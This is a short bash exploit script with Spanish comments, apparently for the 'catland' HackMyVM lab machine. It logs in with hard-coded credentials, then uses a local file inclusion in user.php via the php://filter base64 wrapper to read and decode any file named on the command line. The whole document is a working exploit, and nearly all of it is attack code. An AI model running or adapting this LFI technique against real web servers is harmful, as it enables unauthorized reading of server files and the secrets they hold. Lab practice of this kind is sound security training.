#/bin/bash

# :-------------------------------
# : Variables globales
# :-------------------------------
file_name_lfi="$1"
url_site="http://admin.catland.hmv"

cookie_file="/tmp/admin_catland_cookies.tmp"
lfi_file="/tmp/admin_catland_opened_lfi_file"

# :-------------------------------
# : Petición contra el login, con el generamos la sesión en el servidor web
# :-------------------------------
curl -s -X POST \
  -c $cookie_file \
  -d 'username=laura&password=laura_2008' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  $url_site > /dev/null

# :-------------------------------
# : Petición generando el LFI, nos apoyamos del wrapper base64 para obtener el texto codificado,
# :  internamente le hacemos tratamiento
# :-------------------------------
curl -s -b $cookie_file "${url_site}/user.php?page=php://filter/convert.base64-encode/resource=$file_name_lfi" | tr -d '\n' | sed -n 's/.*form>\(.*\)<h1>.*/\1/p' | awk '{print $1}' | base64 -d > "$lfi_file"

# :-------------------------------
# : Manipulamos el archivo,
# :  le pedimos que con bat haga el output lindo y despues borramos los objetos
# :-------------------------------
bat -P "$lfi_file"
rm -r "$cookie_file" "$lfi_file"
